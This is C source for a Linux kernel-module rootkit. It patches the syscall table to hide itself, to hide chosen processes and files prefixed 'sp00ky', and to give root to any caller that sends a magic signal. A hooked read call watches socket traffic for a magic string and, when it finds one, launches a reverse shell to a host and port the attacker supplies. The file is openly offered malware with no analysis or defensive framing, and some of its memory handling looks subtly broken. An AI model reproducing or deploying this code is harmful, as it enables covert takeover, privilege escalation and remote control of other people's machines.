#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/utsname.h>
#include <linux/dirent.h>
#include <linux/proc_ns.h>
#include <linux/fdtable.h>
#include <linux/stat.h>

#define SIGNAL_HIDE_PROCESS 50
#define SIGNAL_UNHIDE_PROCESS 51
#define SIGNAL_GIVE_ROOT 52
#define SIGNAL_UNHIDE_MODULE 53
#define SIGNAL_HIDE_MODULE 54

#define MAGIC_PREFIX "sp00ky"
#define BACKDOOR_MAGIC "3tph0n3h0m3"

struct linux_dirent {
    unsigned long   d_ino;
    unsigned long   d_off;
    unsigned short  d_reclen;
    char            d_name[1];
};

struct hidden_process {
    pid_t pid;
    struct list_head list;
};

typedef asmlinkage int (*kill_t)(pid_t, int);
typedef asmlinkage int (*getdents_t)(unsigned int, struct linux_dirent *, unsigned int);
typedef asmlinkage int (*getdents64_t)(unsigned int, struct linux_dirent64 *, unsigned int);
typedef asmlinkage ssize_t (*read_t)(int fd, void *buf, size_t count);

kill_t orig_kill;
getdents_t orig_getdents;
getdents64_t orig_getdents64;
read_t orig_read;

LIST_HEAD(hidden_processes);

bool module_hidden;
static struct list_head *prev_mod;

unsigned long *syscall_table;

bool is_process_hidden(pid_t pid)
{
    struct hidden_process *proc;
    list_for_each_entry(proc, &hidden_processes, list) {
        if (proc->pid == pid)
            return true;
    }
    return false;
}

bool hide_process(pid_t pid)
{
    struct hidden_process *proc = kmalloc(sizeof(unsigned long), GFP_KERNEL);
    if (proc == NULL || is_process_hidden(pid))
        return false;
    proc->pid = pid;
    list_add(&proc->list, &hidden_processes);
    return true;
}

void unhide_process(pid_t pid)
{
    struct hidden_process *proc, *tmp;
    list_for_each_entry_safe(proc, tmp, &hidden_processes, list) {
        if (proc->pid == pid) {
            list_del(&proc->list);
            kfree(proc);
        }
    }
}

void give_current_root(void)
{
    struct cred *creds = prepare_creds();
    if (creds != NULL) {
        creds->uid.val = creds->gid.val = 0;
        creds->euid.val = creds->egid.val = 0;
        creds->suid.val = creds->sgid.val = 0;
        creds->fsuid.val = creds->fsgid.val = 0;
        commit_creds(creds);
    }
}

bool is_hidden_dirent(char *d_name, bool proc)
{
    return (proc && is_process_hidden(simple_strtoul(d_name, NULL, 10))) 
        || memcmp(MAGIC_PREFIX, d_name, strlen(MAGIC_PREFIX)) == 0;
}

asmlinkage int intercepted_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
{
    
    /* Invoke our original getdents */
    int ret = orig_getdents(fd, dirp, count);
    if (ret <= 0)
        return ret;

    /* Create a kernel-space copy of our directory entries */
    struct linux_dirent *kdirp = kmalloc(ret, GFP_KERNEL);
    if (kdirp == NULL)
        return ret;
    if (copy_from_user(kdirp, dirp, ret) != 0) {
        kfree(kdirp);
        return ret;
    }

    /* Check if our entries are going to be in /proc/ */
    struct inode *in = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
    bool proc = in->i_ino == PROC_ROOT_INO && !MAJOR(in->i_rdev);

    /* Overwrite or otherwise obscure our hidden entries */
    struct linux_dirent *dir = kdirp, *prev = NULL;
    for (int bpos = 0; bpos < ret; dir = (void*) kdirp + bpos) {
        if (is_hidden_dirent(dir->d_name, proc)) {
            if (prev == NULL) {
                memmove(dir, (void*) dir + dir->d_reclen, ret);
                ret -= dir->d_reclen;
                continue;
            } else {
                prev->d_reclen += dir->d_reclen;
            }
        } else {
            prev = dir;
        }
        bpos += dir->d_reclen;
    }

    /* Copy the modified entries back to user-space and clean up */
    copy_to_user(dirp, kdirp, ret);
    kfree(kdirp);
    return ret;
}

asmlinkage int intercepted_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count)
{

    /* Invoke our original getdents */
    int ret = orig_getdents64(fd, dirp, count);
    if (ret <= 0)
        return ret;

    /* Create a kernel-space copy of our directory entries */
    struct linux_dirent64 *kdirp = kmalloc(ret, GFP_KERNEL);
    if (kdirp == NULL)
        return ret;
    if (copy_from_user(kdirp, dirp, ret) != 0) {
        kfree(kdirp);
        return ret;
    }

    /* Check if our entries are going to be in /proc/ */
    struct inode *in = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
    bool proc = in->i_ino == PROC_ROOT_INO && !MAJOR(in->i_rdev);

    /* Overwrite or otherwise obscure our hidden entries */
    struct linux_dirent64 *dir = kdirp, *prev = NULL;
    for (int bpos = 0; bpos < ret; dir = (void*) kdirp + bpos) {
        if (is_hidden_dirent(dir->d_name, proc)) {
            if (prev == NULL) {
                memmove(dir, (void*) dir + dir->d_reclen, ret);
                ret -= dir->d_reclen;
                continue;
            } else {
                prev->d_reclen += dir->d_reclen;
            }
        } else {
            prev = dir;
        }
        bpos += dir->d_reclen;
    }

    /* Copy the modified entries back to user-space and clean up */
    copy_to_user(dirp, kdirp, ret);
    kfree(kdirp);
    return ret;
}

void hide_module(void)
{
    if (!module_hidden) {
        prev_mod = THIS_MODULE->list.prev;
        list_del(&THIS_MODULE->list);
        kfree(THIS_MODULE->sect_attrs);
        THIS_MODULE->sect_attrs = NULL;
        module_hidden = true;
    }
}

void unhide_module(void)
{
    if (module_hidden) {
        list_add(&THIS_MODULE->list, prev_mod);
        module_hidden = false;
    }
}

asmlinkage int intercepted_kill(pid_t pid, int sig)
{
    switch (sig) {
    case SIGNAL_HIDE_PROCESS:
        hide_process(pid);
        break;
    case SIGNAL_UNHIDE_PROCESS:
        unhide_process(pid);
        break;
    case SIGNAL_GIVE_ROOT:
        give_current_root();
        break;
    case SIGNAL_UNHIDE_MODULE:
        unhide_module();
        break;
    case SIGNAL_HIDE_MODULE:
        hide_module();
        break;
    default:
        return orig_kill(pid, sig);
    }
    return 0;
}

asmlinkage ssize_t intercepted_read(int fd, void __user *buf, size_t count)
{
    ssize_t ret = orig_read(fd, buf, count);

    /* Make sure our data both comes from a socket and can contain the backdoor magic */
    struct inode *in = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
    if (ret <= 0 || ret < strlen(BACKDOOR_MAGIC) || !S_ISSOCK(in->i_mode))
        return ret;

    /* Attempt to find our backdoor's magic in the data */
    char *backdoor = NULL;
    for (int i = 0; i < ret - strlen(BACKDOOR_MAGIC); i++) {
        if (memcmp(buf + i, BACKDOOR_MAGIC, strlen(BACKDOOR_MAGIC)) == 0) {
            backdoor = buf + i;
            break;
        }
    }

    /* If we could not find our backdoor string in the data there's nothing to do */
    if (backdoor == NULL)
        return ret;

    /* Create a kernel-space copy of the data that was read */
    void *kbuf = kmalloc(ret, GFP_KERNEL);
    if (kbuf == NULL)
        return ret;
    if (copy_from_user(kbuf, buf, ret) != 0) {
        kfree(kbuf);
        return ret;
    }

    /* Find the same backdoor string in the kernel-space copy */
    backdoor = kbuf + ((void*) backdoor - buf) + strlen(BACKDOOR_MAGIC) + 1; 

    /* Attempt to parse out the target host and port */
    char *host = backdoor, *port = NULL;
    for (int i = 0; i < 1024; i++) {
        if (backdoor[i] == ':') {
            backdoor[i] = '\0';
            port = backdoor + i + 1;
        } else if (backdoor[i] == '}') {
            backdoor[i] = '\0';
            break;
        }
    }

    /* Now we just invoke our reverse shell */
    char *argv[] = { "/" MAGIC_PREFIX "-util/rev", host, port, NULL };
    static char *envp[] = {"HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);

    /* Clean up the copied userspace data */
    kfree(kbuf);
    return ret;
}

unsigned long *find_syscall_table(void)
{
    
    /* Find the syscall table using an address known to be before it in memory */
    unsigned long *syscall_table = (unsigned long*) sys_close;
    while (syscall_table[__NR_close] != (unsigned long) sys_close) {
        syscall_table++;
    }
    return syscall_table;
}

static int __init ayylkmao_init(void)
{
    syscall_table = find_syscall_table();

    /* Store our original system call addresses */
    orig_kill = (kill_t) syscall_table[__NR_kill];
    orig_getdents = (getdents_t) syscall_table[__NR_getdents];
    orig_getdents64 = (getdents64_t) syscall_table[__NR_getdents64];
    orig_read = (read_t) syscall_table[__NR_read];

    /* Replace them with our alien ones */
    write_cr0(read_cr0() & ~0x10000);
    syscall_table[__NR_kill] = (unsigned long) intercepted_kill;
    syscall_table[__NR_getdents] = (unsigned long) intercepted_getdents;
    syscall_table[__NR_getdents64] = (unsigned long) intercepted_getdents64;
    syscall_table[__NR_read] = (unsigned long) intercepted_read;
    write_cr0(read_cr0() | 0x10000);

    hide_module();
    return 0;
}

static void __exit ayylkmao_uninit(void)
{

    /* Restore the syscall table to its original state */
    write_cr0(read_cr0() & ~0x10000);
    syscall_table[__NR_kill] = (unsigned long) orig_kill;
    syscall_table[__NR_getdents] = (unsigned long) orig_getdents;
    syscall_table[__NR_getdents64] = (unsigned long) orig_getdents64;
    syscall_table[__NR_read] = (unsigned long) orig_read;
    write_cr0(read_cr0() | 0x10000);
}

module_init(ayylkmao_init);
module_exit(ayylkmao_uninit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("derive");
MODULE_DESCRIPTION("An LKM rootkit for aliens by aliens");

